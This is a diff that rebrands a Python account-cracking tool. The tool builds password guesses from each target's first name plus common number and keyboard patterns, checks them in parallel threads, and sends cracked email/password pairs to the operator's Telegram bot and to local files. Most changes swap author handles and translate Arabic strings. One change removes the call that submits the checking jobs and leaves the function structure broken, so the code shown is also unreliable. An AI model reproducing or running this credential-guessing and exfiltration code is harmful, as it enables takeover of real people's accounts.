@@ -7,11 +7,11 @@ except ModuleNotFoundError as x:
 	os.system(f'pip install {m}')
 from concurrent.futures import ThreadPoolExecutor as kil
 
-Id,token = input('\033[2;36m- Enter ID Telegram ~ ID : \033[1;97m'),input('\033[2;36m- Enter Token BOT Telegram ~ Token : \033[1;97m')
-kopo = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(Id) + '&text=' + str('- Tool Run • تم تشغيل اداة سيد المدفوعه  '))
-webbrowser.open('https://t.me/M_O_L_B')
+Id,token = input('\033[2;36m- Enter ID Telegram ~ ادخل ايديك تلجرام : \033[1;97m'),input('\033[2;36m- Enter Token BOT Telegram ~ ادخل توكن البوت : \033[1;97m')
+kopo = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(Id) + '&text=' + str('- Tool Run • تم تشغيل الاداة '))
+webbrowser.open('https://t.me/Pythonln')
 if kopo.status_code == 404:
-	exit('\x1b[91;1m\n - SAYED • ☒ التوكن او الايدي غلط ☒ ')	
+	exit('\x1b[91;1m\n - Kilwa • ☒ التوكن او الايدي غلط ☒ ')	
 bot = telebot.TeleBot(token,parse_mode='HTML')
 	
 os.system('clear')
@@ -49,7 +49,7 @@ def get(user):
 		
 def IDS():
 	global z
-	how = input('- How Many IDs ~  ؟ : ')
+	how = input('- How Many IDs ~ كم ايدي ؟ : ')
 	for n in range(int(how)):
 		z+=1
 		k = input(f'- Enter ID • {z} ادخل الايدي : ')
@@ -69,7 +69,7 @@ def File():
 		os.system('clear')
 		password()
 	except:
-		print('- خطاا ⛔')
+		print('- EROR ⛔')
 	
 def password():
 	with kil(max_workers=30) as kp:
@@ -77,9 +77,10 @@ def password():
 			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
 			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'2020',frs+'07500750',frs+'1986',frs+'1221',frs+'123123',frs+'123321',frs+'22446688',frs+'1988',frs+'1212',frs+'1122',frs+'1234567890',frs+'123456789',frs+'12345678',frs+'1234567',frs+'',frs+'aassddff',frs+'qqwweerr',frs+'aassddffgghhjjkkll',frs+'zzxxccvvbbnnmm',frs+'qqwweerrttyy',frs+'zzxxccvvbbnnmm',frs+'qqwweerrtt',frs+'qqwweerrtt',frs+'١٢٣٤٥',frs+'١٢٣٤٥٦٧٨٩',frs+'١٢٣١٢٣',frs+'١٢',frs+'١١٢٢',frs+'١٢٣٣٢١',frs+'1122334455',frs+'1990',frs+'112233445566',frs+'1122334455']
-			kp.submit(checker,idf,pwv)
+
+def checker(idf,pwv):
 	global total,ok,cp
-	print('\r\033[2;36mϟ \033[1;97m[\033[2;36m☠️☠️\033[1;97m-\033[2;36m☠️☠️\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
+	print('\r\033[2;36mϟ \033[1;97m[\033[2;36mKILWA\033[1;97m-\033[2;36mTOOLS\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
 	for ps in pwv:
 		open('tt.txt','a').write(idf+'|'+ps+'\n')
 		try:
@@ -128,16 +129,16 @@ def password():
 				cp+=1
 				stc = f'''<strong>ϟ Secure Acc ~ حساب سكيور  
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ البريد الاكترونيl -> <code>{idf}</code>
-ϟ كلمة السر -> <code>{ps}</code>
+ϟ Email -> <code>{idf}</code>
+ϟ Pass -> <code>{ps}</code>
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @U1U1_1v4 🔥</strong>'''
+ϟ Programmer • @Lx0b2 🔥</strong>'''
 				stp = f'''\033[1;31mϟ Secure Acc ~ حساب سكيور  
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ البريد الاكترونيl -> {idf}
-ϟ كلمة السر -> {ps}
+ϟ Email -> {idf}
+ϟ Pass -> {ps}
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @U1U1_1v4 🔥'''
+ϟ Programmer • @Lx0b2 🔥'''
 				bot.send_message(Id,stc)
 				print(stp+'\n')
 				open('CPKilwa.txt','a').write(stc+'\n')
@@ -145,16 +146,16 @@ def password():
 				ok+=1
 				okc = f'''<strong>ϟ Good Acc ~ حساب صحيح ✅
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ البريد الاكتروني  -> <code>{idf}</code>
-ϟ كلمة السر -> <code>{ps}</code>
+ϟ Email -> <code>{idf}</code>
+ϟ Pass -> <code>{ps}</code>
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @U1U1_1v4 🔥</strong>'''
-				okp = f'''\033[2;32mϟ Good Acc ~ حساب شغال ✅
+ϟ Programmer • @Lx0b2 🔥</strong>'''
+				okp = f'''\033[2;32mϟ Good Acc ~ حساب صحيح ✅
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ البريد الاكتروني -> {idf}
-ϟ كلمة السر -> {ps}
+ϟ Email -> {idf}
+ϟ Pass -> {ps}
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @U1U1_1v4 🔥'''
+ϟ Programmer • @Lx0b2 🔥'''
 				bot.send_message(Id,okc)
 				print(okp+'\n')
 				open('OKKilwa.txt','a').write(okc+'\n')
